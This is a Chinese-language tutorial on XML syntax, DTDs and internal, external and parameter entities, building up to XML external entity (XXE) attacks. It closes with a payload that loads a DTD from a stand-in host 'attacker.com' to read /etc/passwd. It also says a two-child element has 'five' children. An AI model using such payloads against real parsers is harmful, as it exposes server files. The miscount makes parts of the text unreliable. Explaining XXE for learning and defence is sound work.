# XML 简介

可扩展标记语言（XML）是为存储和传输数据而设计的语言。这种标记语言允许开发人员使用类似于HTML的树状结构，以文本格式定义和表示任意数据结构。

由于 XML 解析器在各种编程语言中广泛可用，并且在软件库中具有广泛支持，处理 XML 文件变得容易得多。虽然 JSON 等较新格式越来越受欢迎，但 XML 仍然普遍存在，尤其是在企业环境中。

各种格式，包括 HTML、PDF、SVG、RTF、RSS 和 DOCX，都利用类 XML 格式进行数据结构化。这些类 XML 格式与 XML 规范有许多共同相似之处，因此许多 XML 解析器也接受它们作为输入。同样，XML-RPC 和 SOAP 等几种网络协议也使用 XML 进行高效的数据交换。

## XML 结构

XML 文档包含标签。让我们看一下 XML 文档的结构。考虑以下表示图书数据的 XML 文档。

**示例**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<book>
    <bookName>The Great Gatsby</bookName>
    <author>F. Scott Fitzgerald</author>
</book>
```

在最开始，有 XML 声明（`<?xml version="1.0" encoding="UTF-8"?>`）。它定义了文档中使用的 XML 版本和字符编码。此声明之后是根元素 `<book>`，它包含提供有关该书具体细节的其他子元素。值得注意的是，XML 区分大小写。例如，使用 `<name>` 作为开始标签和 `</Name>` 作为结束标签将导致错误，因为这两个标签在大小写方面不完全匹配。同样，每个 XML 文档必须有一个包含所有其他元素的单个根元素。

### XML DTD

XML 文档类型定义（DTD）包含可定义 XML 文档结构、可包含的数据类型值以及其他项目的声明。若 XML 文档在语法上正确，但不符合 DTD 规则，它仍然可能被拒绝。

DTD 在 XML 文档开头的可选 `DOCTYPE` 元素中声明。DTD 可以完全自包含在文档本身中（称为“内部 DTD”），也可以从其他地方加载（称为“外部 DTD”），还可以是两者的混合。让我们看一个 DTD 自定义实体的示例：

**示例**
```xml
<!ELEMENT book (bookName, author)>
<!ELEMENT bookName (#PCDATA)>
<!ELEMENT author (#PCDATA)>
```

在此 DTD 中：

- 在最开始，`book` 元素被定义为包含五个子元素：`bookName`、`author`。
- 这些子元素中的每一个都被进一步定义为包含已解析字符数据（`#PCDATA`），这意味着它们可以包含任何文本数据，但不能包含子元素。

因此，遵循此 DTD 的 XML 文档将需要具有指定的结构和元素才能被视为有效，例如以下示例。

**示例**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<book>
    <bookName>The Great Gatsby</bookName>
    <author>F. Scott Fitzgerald</author>
</book>
```

此 DTD 称为内部 DTD，因为它存在于文档本身中，尽管 DTD 不是强制性的，并且由于潜在的开销，通常不鼓励用于处理小型 XML 文件。

### 外部 DTD

XML 外部实体是一种自定义实体，其定义位于声明它们的 DTD 之外。当多个 XML 文档共享相同结构时，这特别有用，可确保一致性和效率。

外部实体的声明使用 `SYSTEM` 关键字，并且必须指定一个 URL，从中应加载该实体的值。

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

该 URL 可以使用 `file://` 协议，因此外部实体可以从文件加载。例如：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```
- 此处可省略 `file://` 协议，而简化为 `/path/to/file`

以下是引用包含 DTD 的 `payload.dtd` 的示例。

**示例**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message SYSTEM "payload.dtd">
<book>
    <bookName>The Great Gatsby</bookName>
    <author>F. Scott Fitzgerald</author>
</book>
```

在此文档中，使用 `SYSTEM` 标识符引用名为 `payload.dtd` 的外部 DTD（省略了 `file://` 协议类型）。这意味着 XML 文档将遵循外部 DTD 文件中定义的结构。`payload.dtd` 包含以下内容：

**示例**
```xml
<!ELEMENT book (bookName, author)>
<!ELEMENT bookName (#PCDATA)>
<!ELEMENT author (#PCDATA)>
```

XML 外部实体是 XML 外部实体攻击（xxe） 产生的主要途径

### XML 实体

XML 上下文中的 XML 实体最好被描述为 XML 文档中的快捷方式或引用。它们可以类似于编程语言中的宏或变量。实体主要有两种类型：

- **通用实体（General Entities）**：在 XML 文档的内容中使用。
- **参数实体（Parameter Entities）**：主要用于模块化，在 DTD 中定义，并可在 DTD 的不同部分后续使用。

实体可用于在内部以及外部引用数据。

- **内部实体（Internal Entities）**：在同一 XML 或 DTD 文件中定义和使用。
- **外部实体（External Entities）**：指向 XML/DTD 文件之外的内容或任何其他类型的文本文件。

下表包含预定义实体列表。

**XML 中的预定义实体列表**

| 实体    | 字符         |
|---------|--------------|
| `&lt;`  | 小于号 `<`   |
| `&gt;`  | 大于号 `>`   |
| `&amp;` | 和号 `&`     |
| `&apos;`| 撇号 `'`     |
| `&quot;`| 引号 `"`     |

例如，无需在 XML 文档中多次编写作者名“F. Scott Fitzgerald”，您可以将其定义为实体并在整个文档中使用该实体。

**示例：内部实体**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
    <!ENTITY authorName "F. Scott Fitzgerald">
]>
<book>
    <bookName>The Great Gatsby</bookName>
    <author>&authorName;</author>
</book>
```

在这种情况下，`&authorName;` 是一个表示“F. Scott Fitzgerald”的实体。因此，每当解析器遇到 `&authorName;` 时，它会将其替换为“F. Scott Fitzgerald”。

类似地，我们也可以将外部实体包含到 XML 文档中。考虑此示例：

**示例：外部实体**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
    <!ENTITY authorBio SYSTEM "https://example.com/author_bio.txt">
]>
<book>
    <bookName>The Great Gatsby</bookName>
    <author>F. Scott Fitzgerald</author>
    <authorBiography>&authorBio;</authorBiography>
</book>
```

在此示例中，创建了一个名为 `authorBio` 的实体，它指向位于外部站点的 `author_bio.txt` 文件。使用 `&authorBio;` 外部实体引用引用该实体，该引用获取并加载 `author_bio.txt` 文件的内容，并将其作为文档的一部分包含在内。

#### 参数实体

参数实体允许代码模块化；它们可用于定义可在文档中不同位置重用的 DTD 语法。参数实体可用于引用外部资源，使 XML 解析器从该资源获取内容。如果该资源是攻击者控制的，则可以通过检查日志来观察，从而可能确认漏洞。参数实体可以在实体名称前使用百分号（`%`）来声明。

**示例：**
```xml
<!ENTITY % myEntity "tmgm">
```

它们可以通过使用百分号以类似方式引用。

**示例**
```xml
%myEntity;
```

设置 `attacker.com/xxe.dtd` 文件将包含对 `/etc/passwd` 文件的引用
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

基于此，XXE 有效载荷将如下所示：
```xml
<!DOCTYPE root [
    <!ENTITY % external SYSTEM "http://attacker.com/xxe.dtd">
    %external;
]>
<root/>
```
